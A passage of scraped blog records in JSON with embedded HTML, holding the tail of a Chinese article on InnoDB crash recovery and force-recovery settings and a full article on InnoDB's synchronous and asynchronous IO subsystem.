主要思想就是在每次checkpoint后，在第一次修改某个表时，先写一个新日志mlog_file_name(包括space_id和filename的映射)，来表示对这个表进行了操作，后续对这个表的操作就不用写这个新日志了，当需要崩溃恢复时候，多一次扫描，通过搜集mlog_file_name来确定哪些表被修改过，这样就不需要打开所有的表来确定space_id了。</li>\n<li>最后一个值得注意的地方是内存。之前说过，如果有太多的日志已经被分发，占用了太多的内存，日志解析函数会在适当的时候应用日志，而不是等到最后才一起应用。那么问题来了，使用了多大的内存就会出发应用日志逻辑。答案是：buffer_pool_size_in_bytes – 512 * buffer_pool_instance_num * 16KB。由于buffer_pool_instance_num一般不会太大，所以可以任务，buffer pool的大部分内存都被用来存放日志。剩下的那些主要留给应用日志时读取的数据页，因为目前来说日志应用是单线程的，读取一个日志，把所有日志应用完，然后就可以刷回磁盘了，不需要太多的内存。</li>\n</ul>\n<h2 id=\"redo日志应用函数\">redo日志应用函数</h2>\n<p>应用日志的上层函数为<code>recv_apply_hashed_log_recs</code>(应用日志也可能在io_helper函数中进行)，主要作用就是遍历hash_table，从磁盘读取对每个数据页，依次应用哈希桶中的日志。应用完所有的日志后，如果需要则把buffer_pool的页面都刷盘，毕竟空间有限。有以下几点值得注意：</p>\n<ul>\n<li>同一个数据页的日志必须按照lsn从小到大应用，否则数据会被覆盖。只应用redo日志lsn大于page_lsn的日志，只有这些日志需要重做，其余的忽略。应用完日志后，把脏页加入脏页列表，由于脏页列表是按照最老修改lsn(oldest_modification)来排序的，这里通过引入一颗红黑树来加速查找插入的位置，时间复杂度从之前的线性查找降为对数级别。</li>\n<li>当需要某个数据页的时候，如果发现其没有在Buffer Pool中，则会查看这个数据页周围32个数据页，是否也需要做恢复，如果需要则可以一起读取出来，相当于做了一次io合并，减少io操作(<code>recv_read_in_area</code>)。由于这个是异步读取，所以最终应用日志的活儿是由io_helper线程来做的(<code>buf_page_io_complete</code>)，此外，为了防止短时间发起太多的io，在代码中加了流量控制的逻辑(<code>buf_read_recv_pages</code>)。如果发现某个数据页在内存中，则直接调用<code>recv_recover_page</code>应用日志。由此我们可以看出，InnoDB应用日志其实并不是单线程的来应用日志的，除了崩溃恢复的主线程外，io_helper线程也会参与恢复。并发线程数取决于io_helper中读取线程的个数。</li>\n</ul>\n<p>执行完了redo前滚数据库，数据库的所有数据页已经处于一致的状态，undo回滚数据库就可以安全的执行了。数据库崩溃的时候可能有一些没有提交的事务或者已经提交的事务，这个时候就需要决定是否提交。主要分为三步，首先是扫描undo日志，重新建立起undo日志链表，接着是，依据上一步建立起的链表，重建崩溃前的事务，即恢复当时事务的状态。最后，就是依据事务的不同状态，进行回滚或者提交。</p>\n<h2 id=\"undo日志回滚数据库\">undo日志回滚数据库</h2>\n<p>在<code>recv_recovery_from_checkpoint_start_func</code>之后，<code>recv_recovery_from_checkpoint_finish</code>之前，调用了<code>trx_sys_init_at_db_start</code>，这个函数做了上述三步中的前两步。<br>\n第一步在函数<code>trx_rseg_array_init</code>中处理，遍历整个undo日志空间(最多TRX_SYS_N_RSEGS(128)个segment)，如果发现某个undo segment非空，就进行初始化(<code>trx_rseg_create_instance</code>)。整个每个undo segment，如果发现undo slot非空(最多TRX_RSEG_N_SLOTS(1024)个slot)，也就行初始化(<code>trx_undo_lists_init</code>)。在初始化undo slot后，就把不同类型的undo日志放到不同链表中(<code>trx_undo_mem_create_at_db_start</code>)。undo日志主要分为两种：TRX_UNDO_INSERT和TRX_UNDO_UPDATE。前者主要是提供给insert操作用的，后者是给update和delete操作使用。之前说过，undo日志有两种作用，事务回滚时候用和MVCC快照读取时候用。由于insert的数据不需要提供给其他线程用，所以只要事务提交，就可以删除TRX_UNDO_INSERT类型的undo日志。TRX_UNDO_UPDATE在事务提交后还不能删除，需要保证没有快照使用它的时候，才能通过后台的purge线程清理。<br>\n第二步在函数<code>trx_lists_init_at_db_start</code>中进行，由于第一步中，已经在内存中建立起了undo_insert_list和undo_update_list(链表每个undo segment独立)，所以这一步只需要遍历所有链表，重建起事务的状态(<code>trx_resurrect_insert</code>和<code>trx_resurrect_update</code>)。简单的说，如果undo日志的状态是TRX_UNDO_ACTIVE，则事务的状态为TRX_ACTIVE，如果undo日志的状态是TRX_UNDO_PREPARED，则事务的状态为TRX_PREPARED。这里还要考虑变量srv_force_recovery的设置，如果这个变量值为非0，所有的事务都会回滚(即事务被设置为TRX_ACTIVE)，即使事务的状态应该为TRX_STATE_PREPARED。重建起事务后，按照事务id加入到trx_sys-&gt;trx_list链表中。最后，在函数<code>trx_sys_init_at_db_start</code>中，会统计所有需要回滚的事务(事务状态为TRX_ACTIVE)一共需要回滚多少行数据，输出到错误日志中，类似：5 transaction(s) which must be rolled back or cleaned up。InnoDB: in total 342232 row operations to undo的字样。<br>\n第三步的操作在两个地方被调用。一个是在<code>recv_recovery_from_checkpoint_finish</code>的最后，另外一个是在<code>recv_recovery_rollback_active</code>中。前者主要是回滚对数据字典的操作，也就是回滚DDL语句的操作，后者是回滚DML语句。前者是在数据库可提供服务之前必须完成，后者则可以在数据库提供服务(也即是崩溃恢复结束)之后继续进行(通过新开一个后台线程<code>trx_rollback_or_clean_all_recovered</code>来处理)。因为InnoDB认为数据字典是最重要的，必须要回滚到一致的状态才行，而用户表的数据可以稍微慢一点，对外提供服务后，慢慢恢复即可。因此我们常常在会发现数据库已经启动起来了，然后错误日志中还在不断的打印回滚事务的信息。事务回滚的核心函数是<code>trx_rollback_or_clean_recovered</code>，逻辑很简单，只需要遍历trx_sys-&gt;trx_list，按照事务不同的状态回滚或者提交即可(<code>trx_rollback_resurrected</code>)。这里要注意的是，如果事务是TRX_STATE_PREPARED状态，那么在InnoDB层，不做处理，需要在Server层依据binlog的情况来决定是否回滚事务，如果binlog已经写了，事务就提交，因为binlog写了就可能被传到备库，如果主库回滚会导致主备数据不一致，如果binlog没有写，就回滚事务。</p>\n<h2 id=\"崩溃恢复相关参数解析\">崩溃恢复相关参数解析</h2>\n<p><strong><em>innodb_fast_shutdown: </em></strong><br>\ninnodb_fast_shutdown = 0。这个表示在MySQL关闭的时候，执行slow shutdown，不但包括日志的刷盘，数据页的刷盘，还包括数据的清理(purge)，ibuf的合并，buffer pool dump以及lazy table drop操作(如果表上有未完成的操作，即使执行了drop table且返回成功了，表也不一定立刻被删除)。<br>\ninnodb_fast_shutdown = 1。这个是默认值，表示在MySQL关闭的时候，仅仅把日志和数据刷盘。<br>\ninnodb_fast_shutdown = 2。这个表示关闭的时候，仅仅日志刷盘，其他什么都不做，就好像MySQL crash了一样。<br>\n这个参数值越大，MySQL关闭的速度越快，但是启动速度越慢，相当于把关闭时候需要做的工作挪到了崩溃恢复上。另外，如果MySQL要升级，建议使用第一种方式进行一次干净的shutdown。</p>\n<p><strong><em>innodb_force_recovery: </em></strong><br>\n这个参数主要用来控制InnoDB启动时候做哪些工作，数值越大，做的工作越少，启动也更加容易，但是数据不一致的风险也越大。当MySQL因为某些不可控的原因不能启动时，可以设置这个参数，从1开始逐步递增，知道MySQL启动，然后使用SELECT INTO OUTFILE把数据导出，尽最大的努力减少数据丢失。<br>\ninnodb_force_recovery = 0。这个是默认的参数，启动的时候会做所有的事情，包括redo日志应用，undo日志回滚，启动后台master和purge线程，ibuf合并。检测到了数据页损坏了，如果是系统表空间的，则会crash，用户表空间的，则打错误日志。<br>\ninnodb_force_recovery = 1。如果检测到数据页损坏了，不会crash也不会报错(<code>buf_page_io_complete</code>)，启动的时候也不会校验表空间第一个数据页的正确性(<code>fil_check_first_page</code>)，表空间无法访问也继续做崩溃恢复(<code>fil_open_single_table_tablespace</code>、<code>fil_load_single_table_tablespace</code>)，ddl操作不能进行(<code>check_if_supported_inplace_alter</code>)，同时数据库也被不能进行写入操作(<code>row_insert_for_mysql</code>、<code>row_update_for_mysql</code>等)，所有的prepare事务也会被回滚(<code>trx_resurrect_insert</code>、<code>trx_resurrect_update_in_prepared_state</code>)。这个选项还是很常用的，数据页可能是因为磁盘坏了而损坏了，设置为1，能保证数据库正常启动。<br>\ninnodb_force_recovery = 2。除了设置1之后的操作不会运行，后台的master和purge线程就不会启动了(<code>srv_master_thread</code>、<code>srv_purge_coordinator_thread</code>等)，当你发现数据库因为这两个线程的原因而无法启动时，可以设置。<br>\ninnodb_force_recovery = 3。除了设置2之后的操作不会运行，undo回滚数据库也不会进行，但是回滚段依然会被扫描，undo链表也依然会被创建(<code>trx_sys_init_at_db_start</code>)。srv_read_only_mode会被打开。<br>\ninnodb_force_recovery = 4。除了设置3之后的操作不会运行，ibuf的操作也不会运行(<code>ibuf_merge_or_delete_for_page</code>)，表信息统计的线程也不会运行(因为一个坏的索引页会导致数据库崩溃)(<code>info_low</code>、<code>dict_stats_update</code>等)。从这个选项开始，之后的所有选项，都会损坏数据，慎重使用。<br>\ninnodb_force_recovery = 5。除了设置4之后的操作不会运行，回滚段也不会被扫描(<code>recv_recovery_rollback_active</code>)，undo链表也不会被创建，这个主要用在undo日志被写坏的情况下。<br>\ninnodb_force_recovery = 6。除了设置5之后的操作不会运行，数据库前滚操作也不会进行，包括解析和应用(<code>recv_recovery_from_checkpoint_start_func</code>)。</p>\n<h2 id=\"总结\">总结</h2>\n<p>InnoDB实现了一套完善的崩溃恢复机制，保证在任何状态下(包括在崩溃恢复状态下)数据库挂了，都能正常恢复，这个是与文件系统最大的差别。此外，崩溃恢复通过redo日志这种物理日志来应用数据页的方法，给MySQL Replication带来了新的思路，备库是否可以通过类似应用redo日志的方式来同步数据呢？阿里云RDS MySQL团队在后续的产品中，给大家带来了类似的特性，敬请期待。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113312\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113312votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113312\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "title": "MySQL 引擎特性：InnoDB IO 子系统", "fav_nums": 0, "url": "http://blog.jobbole.com/113310/", "create_date": "2017/12/12", "url_object_id": "c69bda76164398ee6c9c06ef369e13ed", "comment_nums": 0, "front_image_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/coderyuhui/p/6498382.html\">水中的泪</a>   </div><h2 id=\"前言\">前言</h2>\n<p>InnoDB做为一款成熟的跨平台数据库引擎，其实现了一套高效易用的IO接口，包括同步异步IO，IO合并等。本文简单介绍一下其内部实现，主要的代码集中在os0file.cc这个文件中。本文的分析默认基于MySQL 5.6，CentOS 6，gcc 4.8，其他版本的信息会另行指出。</p>\n<h2 id=\"基础知识\">基础知识</h2>\n<p><strong><em>WAL技术 :</em></strong> 日志先行技术，基本所有的数据库，都使用了这个技术。简单的说，就是需要写数据块的时候，数据库前台线程把对应的日志先写（批量顺序写）到磁盘上，然后就告诉客户端操作成功，至于真正写数据块的操作（离散随机写）则放到后台IO线程中。使用了这个技术，虽然多了一个磁盘写入操作，但是由于日志是批量顺序写，效率很高，所以客户端很快就能得到相应。此外，如果在真正的数据块落盘之前，数据库奔溃，重启时候，数据库可以使用日志来做崩溃恢复，不会导致数据丢失。<br>\n<strong><em>数据预读 :</em></strong> 与数据块A“相邻”的数据块B和C在A被读取的时候，B和C也会有很大的概率被读取，所以可以在读取B的时候，提前把他们读到内存中，这就是数据预读技术。这里说的相邻有两种含义，一种是物理上的相邻，一种是逻辑上的相邻。底层数据文件中相邻，叫做物理上相邻。如果数据文件中不相邻，但是逻辑上相邻（id=1的数据和id=2的数据，逻辑上相邻，但是物理上不一定相邻，可能存在同一个文件中不同的位置），则叫逻辑相邻。<br>\n<strong><em>文件打开模式 :</em></strong> Open系统调用常见的模式主要三种：O_DIRECT，O_SYNC以及default模式。O_DIRECT模式表示后续对文件的操作不使用文件系统的缓存，用户态直接操作设备文件，绕过了内核的缓存和优化，从另外一个角度来说，使用O_DIRECT模式进行写文件，如果返回成功，数据就真的落盘了（不考虑磁盘自带的缓存），使用O_DIRECT模式进行读文件，每次读操作是真的从磁盘中读取，不会从文件系统的缓存中读取。O_SYNC表示使用操作系统缓存，对文件的读写都经过内核，但是这个模式还保证每次写数据后，数据一定落盘。default模式与O_SYNC模式类似，只是写数据后不保证数据一定落盘，数据有可能还在文件系统中，当主机宕机，数据有可能丢失。<br>\n此外，写操作不仅需要修改或者增加的数据落盘，而且还需要文件元信息落盘，只有两部分都落盘了，才能保证数据不丢。O_DIRECT模式不保证文件元信息落盘(但大部分文件系统都保证，Bug #45892)，因此如果不做其他操作，用O_DIRECT写文件后，也存在丢失的风险。O_SYNC则保证数据和元信息都落盘。default模式两种数据都不保证。<br>\n调用函数fsync后，能保证数据和日志都落盘，因此使用O_DIRECT和default模式打开的文件，写完数据，需要调用fsync函数。<br>\n<strong><em>同步IO :</em></strong> 我们常用的read/write函数（Linux上）就是这类IO，特点是，在函数执行的时候，调用者会等待函数执行完成，而且没有消息通知机制，因为函数返回了，就表示操作完成了，后续直接检查返回值就可知道操作是否成功。这类IO操作，编程比较简单，在同一个线程中就能完成所有操作，但是需要调用者等待，在数据库系统中，比较适合急需某些数据的时候调用，例如WAL中日志必须在返回客户端前落盘，则进行一次同步IO操作。<br>\n<strong><em>异步IO :</em></strong> 在数据库中，后台刷数据块的IO线程，基本都使用了异步IO。数据库前台线程只需要把刷块请求提交到异步IO的队列中即可返回做其他事情，而后台线程IO线程，则定期检查这些提交的请求是否已经完成，如果完成再做一些后续处理工作。同时异步IO由于常常是一批一批的请求提交，如果不同请求访问同一个文件且偏移量连续，则可以合并成一个IO请求。例如，第一个请求读取文件1，偏移量100开始的200字节数据，第二个请求读取文件1，偏移量300开始的100字节数据，则这两个请求可以合并为读取文件1，偏移量100开始的300字节数据。数据预读中的逻辑预读也常常使用异步IO技术。<br>\n目前Linux上的异步IO库，需要文件使用O_DIRECT模式打开，且数据块存放的内存地址、文件读写的偏移量和读写的数据量必须是文件系统逻辑块大小的整数倍，文件系统逻辑块大小可以使用类似<code>sudo blockdev --getss /dev/sda5</code>的语句查询。如果上述三者不是文件系统逻辑块大小的整数倍，则在调用读写函数时候会报错EINVAL，但是如果文件不使用O_DIRECT打开，则程序依然可以运行，只是退化成同步IO，阻塞在io_submit函数调用上。</p>\n<h2 id=\"innodb常规io操作以及同步io\">InnoDB常规IO操作以及同步IO</h2>\n<p>在InnoDB中，如果系统有pread/pwrite函数(<code>os_file_read_func</code>和<code>os_file_write_func</code>)，则使用它们进行读写，否则使用lseek+read/write方案。这个就是InnoDB同步IO。查看pread/pwrite文档可知，这两个函数不会改变文件句柄的偏移量且线程安全，所以多线程环境下推荐使用，而lseek+read/write方案则需要自己使用互斥锁保护，在高并发情况下，频繁的陷入内核态，对性能有一定影响。</p>\n<p>在InnoDB中，使用open系统调用打开文件(<code>os_file_create_func</code>)，模式方面除了O_RDONLY(只读)，O_RDWR(读写)，O_CREAT(创建文件)外，还使用了O_EXCL(保证是这个线程创建此文件)和O_TRUNC(清空文件)。默认情况下(数据库不设置为只读模式)，所有文件都以O_RDWR模式打开。innodb_flush_method这个参数比较重要，重点介绍一下：</p>\n<ul>\n<li>如果innodb_flush_method设置了O_DSYNC，日志文件(ib_logfileXXX)使用O_SYNC打开，因此写完数据不需要调用函数fsync刷盘，数据文件(ibd)使用default模式打开，因此写完数据需要调用fsync刷盘。</li>\n<li>如果innodb_flush_method设置了O_DIRECT，日志文件(ib_logfileXXX)使用default模式打开，写完数据需要调用fsync函数刷盘，数据文件(ibd)使用O_DIRECT模式打开，写完数据需要调用fsync函数刷盘。</li>\n<li>如果innodb_flush_method设置了fsync或者不设置，数据文件和日志文件都使用default模式打开，写完数据都需要使用fsync来刷盘。</li>\n<li>如果innodb_flush_method设置为O_DIRECT_NO_FSYNC，文件打开方式与O_DIRECT模式类似，区别是，数据文件写完后，不调用fsync函数来刷盘，主要针对O_DIRECT能保证文件的元数据也落盘的文件系统。<br>\nInnoDB目前还不支持使用O_DIRECT模式打开日志文件，也不支持使用O_SYNC模式打开数据文件。<br>\n注意，如果使用linux native aio（详见下一节），innodb_flush_method一定要配置成O_DIRECT，否则会退化成同步IO（错误日志中不会有任务提示）。</li>\n</ul>\n<p>InnoDB使用了文件系统的文件锁来保证只有一个进程对某个文件进行读写操作(<code>os_file_lock</code>)，使用了建议锁(Advisory locking)，而不是强制锁(Mandatory locking)，因为强制锁在不少系统上有bug，包括linux。在非只读模式下，所有文件打开后，都用文件锁锁住。</p>\n<p>InnoDB中目录的创建使用递归的方式(<code>os_file_create_subdirs_if_needed</code>和<code>os_file_create_directory</code>)。例如，需要创建/a/b/c/这个目录，先创建c，然后b，然后a，创建目录调用mkdir函数。此外，创建目录上层需要调用<code>os_file_create_simple_func</code>函数，而不是<code>os_file_create_func</code>，需要注意一下。</p>\n<p>InnoDB也需要临时文件，临时文件的创建逻辑比较简单(<code>os_file_create_tmpfile</code>)，就是在tmp目录下成功创建一个文件后直接使用unlink函数释放掉句柄，这样当进程结束后(不管是正常结束还是异常结束)，这个文件都会自动释放。InnoDB创建临时文件，首先复用了server层函数mysql_tmpfile的逻辑，后续由于需要调用server层的函数来释放资源，其又调用dup函数拷贝了一份句柄。</p>\n<p>如果需要获取某个文件的大小，InnoDB并不是去查文件的元数据(<code>stat</code>函数)，而是使用<code>lseek(file, 0, SEEK_END)</code>的方式获取文件大小，这样做的原因是防止元信息更新延迟导致获取的文件大小有误。</p>\n<p>InnoDB会预分配一个大小给所有新建的文件(包括数据和日志文件)，预分配的文件内容全部置为零(<code>os_file_set_size</code>)，当前文件被写满时，再进行扩展。此外，在日志文件创建时，即install_db阶段，会以100MB的间隔在错误日志中输出分配进度。</p>\n<p>总体来说，常规IO操作和同步IO相对比较简单，但是在InnoDB中，数据文件的写入基本都用了异步IO。</p>\n<h2 id=\"innodb异步io\">InnoDB异步IO</h2>\n<p>由于MySQL诞生在Linux native aio之前，所以在MySQL异步IO的代码中，有两种实现异步IO的方案。<br>\n第一种是原始的Simulated aio，InnoDB在Linux native air被import进来之前以及某些不支持air的系统上，自己模拟了一条aio的机制。异步读写请求提交时，仅仅把它放入一个队列中，然后就返回，程序可以去做其他事情。后台有若干异步io处理线程(innobase_read_io_threads和innobase_write_io_threads这两个参数控制)不断从这个队列中取出请求，然后使用同步IO的方式完成读写请求以及读写完成后的工作。<br>\n另外一种就是Native aio。目前在linux上使用io_submit，io_getevents等函数完成(不使用glibc aio，这个也是模拟的)。提交请求使用io_submit, 等待请求使用io_getevents。另外，window平台上也有自己对应的aio，这里就不介绍了，如果使用了window的技术栈，数据库应该会选用sqlserver。目前，其他平台(Linux和window之外)都只能使用Simulate aio。</p>\n<p>首先介绍一下一些通用的函数和结构，接下来分别详细介绍一下Simulate alo和Linux上的Native aio。<br>\n在os0file.cc中定义了全局数组，类型为<code>os_aio_array_t</code>，这些数组就是Simulate aio用来缓存读写请求的队列，数组的每一个元素是<code>os_aio_slot_t</code>类型，里面记录了每个IO请求的类型，文件的fd，偏移量，需要读取的数据量，IO请求发起的时间，IO请求是否已经完成等。另外，Linux native io中的struct iocb也在<code>os_aio_slot_t</code>中。数组结构<code>os_aio_slot_t</code>中，记录了一些统计信息，例如有多少数据元素(<code>os_aio_slot_t</code>)已经被使用了，是否为空，是否为满等。这样的全局数组一共有5个，分别用来保存数据文件读异步请求(<code>os_aio_read_array</code>)，数据文件写异步请求(<code>os_aio_write_array</code>)，日志文件写异步请求(<code>os_aio_log_array</code>)，insert buffer写异步请求(<code>os_aio_ibuf_array</code>)，数据文件同步读写请求(<code>os_aio_sync_array</code>)。日志文件的数据块写入是同步IO，但是这里为什么还要给日志写分配一个异步请求队列(<code>os_aio_log_array</code>)呢？原因是，InnoDB日志文件的日志头中，需要记录checkpoint的信息，目前checkpoint信息的读写还是用异步IO来实现的，因为不是很紧急。在window平台中，如果对特定文件使用了异步IO，就这个文件就不能使用同步IO了，所以引入了数据文件同步读写请求队列(<code>os_aio_sync_array</code>)。日志文件不需要读异步请求队列，因为只有在做奔溃恢复的时候日志才需要被读取，而做崩溃恢复的时候，数据库还不可用，因此完全没必要搞成异步读取模式。这里有一点需要注意，不管变量innobase_read_io_threads和innobase_write_io_threads两个参数是多少，<code>os_aio_read_array</code>和<code>os_aio_write_array</code>都只有一个，只不过数据中的<code>os_aio_slot_t</code>元素会相应增加，在linux中，变量加1，元素数量增加256。例如，innobase_read_io_threads=4，则os_aio_read_array数组被分成了四部分，每一个部分256个元素，每个部分都有自己独立的锁、信号量以及统计变量，用来模拟4个线程，innobase_write_io_threads类似。从这里我们也可以看出，每个异步read/write线程能缓存的读写请求是有上限的，即为256，如果超过这个数，后续的异步请求需要等待。256可以理解为InnoDB层对异步IO并发数的控制，而在文件系统层和磁盘层面也有长度限制，分别使用<code>cat /sys/block/sda/queue/nr_requests</code>和<code>cat /sys/block/sdb/queue/nr_requests</code>查询。<br>\n<code>os_aio_init</code>在InnoDB启动的时候调用，用来初始化各种结构，包括上述的全局数组，还有Simulate aio中用的锁和互斥量。<code>os_aio_free</code>则释放相应的结构。<code>os_aio_print_XXX</code>系列的函数用来输出aio子系统的状态，主要用在<code>show engine innodb status</code>语句中。</p>\n<h3 id=\"simulate-aio\">Simulate aio</h3>\n<p>Simulate aio相对Native aio来说，由于InnoDB自己实现了一套模拟机制，相对比较复杂。</p>\n<ul>\n<li>入口函数为<code>os_aio_func</code>，在debug模式下，会校验一下参数，例如数据块存放的内存地址、文件读写的偏移量和读写的数据量是否是OS_FILE_LOG_BLOCK_SIZE的整数倍，但是没有检验文件打开模式是否用了O_DIRECT，因为Simulate aio最终都是使用同步IO，没有必要一定要用O_DIRECT打开文件。</li>\n<li>校验通过后，就调用<code>os_aio_array_reserve_slot</code>，作用是把这个IO请求分配到某一个后台io处理线程(innobase_xxxx_io_threads分配的，但其实是在同一个全局数组中)中，并把io请求的相关信息记录下来，方便后台io线程处理。如果IO请求类型相同，请求同一个文件且偏移量比较接近(默认情况下，偏移量差别在1M内)，则InnoDB会把这两个请求分配到同一个io线程中，方便在后续步骤中IO合并。</li>\n<li>提交IO请求后，需要唤醒后台io处理线程，因为如果后台线程检测到没有IO请求，会进入等待状态(<code>os_event_wait</code>)。</li>\n<li>至此，函数返回，程序可以去干其他事情了，后续的IO处理交给后台线程了。<br>\n介绍一下后台IO线程怎么处理的。</li>\n<li>InnoDB启动时，后台IO线程会被启动(<code>io_handler_thread</code>)。其会调用<code>os_aio_simulated_handle</code>从全局数组中取出IO请求，然后用同步IO处理，结束后，需要做收尾工作，例如，如果是写请求的话，则需要在buffer pool中把对应的数据页从脏页列表中移除。</li>\n<li><code>os_aio_simulated_handle</code>首先需要从数组中挑选出某个IO请求来执行，挑选算法并不是简单的先进先出，其挑选所有请求中offset最小的请求先处理，这样做是为了后续的IO合并比较方便计算。但是这也容易导致某些offset特别大的孤立请求长时间没有被执行到，也就是饿死，为了解决这个问题，在挑选IO请求之前，InnoDB会先做一次遍历，如果发现有请求是2s前推送过来的(也就是等待了2s)，但是还没有被执行，就优先执行最老的请求，防止这些请求被饿死，如果有两个请求等待时间相同，则选择offset小的请求。</li>\n<li><code>os_aio_simulated_handle</code>接下来要做的工作就是进行IO合并，例如，读请求1请求的是file1，offset100开始的200字节，读请求2请求的是file1，offset300开始的100字节，则这两个请求可以合并为一个请求：file1，offset100开始的300字节，IO返回后，再把数据拷贝到原始请求的buffer中就可以了。写请求也类似，在写操作之前先把需要写的数据拷贝到一个临时空间，然后一次写完。注意，只有在offset连续的情况下IO才会合并，有间断或者重叠都不会合并，一模一样的IO请求也不会合并，所以这里可以算是一个可优化的点。</li>\n<li><code>os_aio_simulated_handle</code>如果发现现在没有IO请求，就会进入等待状态，等待被唤醒</li>\n</ul>\n<p>综上所述，可以看出IO请求是一个一个的push的对立面，每push进一个后台线程就拿去处理，如果后台线程优先级比较高的话，IO合并效果可能比较差，为了解决这个问题，Simulate aio提供类似组提交的功能，即一组IO请求提交后，才唤醒后台线程，让其统一进行处理，这样IO合并的效果会比较好。但这个依然有点小问题，如果后台线程比较繁忙的话，其就不会进入等待状态，也就是说只要请求进入了队列，就会被处理。这个问题在下面的Native aio中可以解决。<br>\n总体来说，InnoDB实现的这一套模拟机制还是比较安全可靠的，如果平台不支持Native aio则使用这套机制来读写数据文件。</p>\n<h3 id=\"linux-native-aio\">Linux native aio</h3>\n<p>如果系统安装了libaio库且在配置文件里面设置了innodb_use_native_aio=on则启动时候会使用Native aio。</p>\n<ul>\n<li>入口函数依然为<code>os_aio_func</code>，在debug模式下，依然会检查传入的参数，同样不会检查文件是否以O_DIRECT模式打开，这算是一个有点风险的点，如果用户不知道linux native aio需要使用O_DIRECT模式打开文件才能发挥出aio的优势，那么性能就不会达到预期。建议在此处做一下检查，有问题输出到错误日志。</li>\n<li>检查通过之后，与Simulated aio一样，调用<code>os_aio_array_reserve_slot</code>，把IO请求分配给后台线程，分配算法也考虑了后续的IO合并，与Simulated aio一样。不同之处，主要是需要用IO请求的参数初始化iocb这个结构。IO请求的相关信息除了需要初始化iocb外，也需要在全局数组的slot中记录一份，主要是为了在<code>os_aio_print_XXX</code>系列函数中统计方便。</li>\n<li>调用io_submit提交请求。</li>\n<li>至此，函数返回，程序可以去干其他事情了，后续的IO处理交给后台线程了。<br>\n接下来是后台IO线程。</li>\n<li>与Simulate aio类似，后台IO线程也是在InnoDB启动时候启动。如果是Linux native aio，后续会调用<code>os_aio_linux_handle</code>这个函数。这个函数的作用与<code>os_aio_simulated_handle</code>类似，但是底层实现相对比较简单，其仅仅调用io_getevents函数等待IO请求完成。超时时间为0.5s，也就是说如果即使0.5内没有IO请求完成，函数也会返回，继续调用io_getevents等待，当然在等待前会判断一下服务器是否处于关闭状态，如果是则退出。</li>\n</ul>\n<p>在分发IO线程时，尽量把相邻的IO放在一个线程内，这个与Simulate aio类似，但是后续的IO合并操作，Simulate aio是自己实现，Native aio则交给内核完成了，因此代码比较简单。<br>\n还要一个区别是，当没有IO请求的时候，Simulate aio会进入等待状态，而Native aio则会每0.5秒醒来一次，做一些检查工作，然后继续等待。因此，当有新的请求来时，Simulated aio需要用户线程唤醒，而Native aio不需要。此外，在服务器关闭时，Simulate aio也需要唤醒，Native aio则不需要。</p>\n<p>可以发现，Native aio与Simulate aio类似，请求也是一个一个提交，然后一个一个处理，这样会导致IO合并效果比较差。Facebook团队提交了一个Native aio的组提交优化：把IO请求首先缓存，等IO请求都到了之后，再调用io_submit函数，一口气提交先前的所有请求(io_submit可以一次提交多个请求)，这样内核就比较方便做IO优化。Simulate aio在IO线程压力大的情况下，组提交优化会失效，而Native aio则不会。注意，组提交优化，不能一口气提交太多，如果超过了aio等待队列长度，会强制发起一次io_submit。</p>\n<h2 id=\"总结\">总结</h2>\n<p>本文详细介绍了InnoDB中IO子系统的实现以及使用需要注意的点。InnoDB日志使用同步IO，数据使用异步IO，异步IO的写盘顺序也不是先进先出的模式，这些点都需要注意。Simulate aio虽然有比较大的学习价值，但是在现代操作系统中，推荐使用Native aio。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113310\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113310votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113310\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
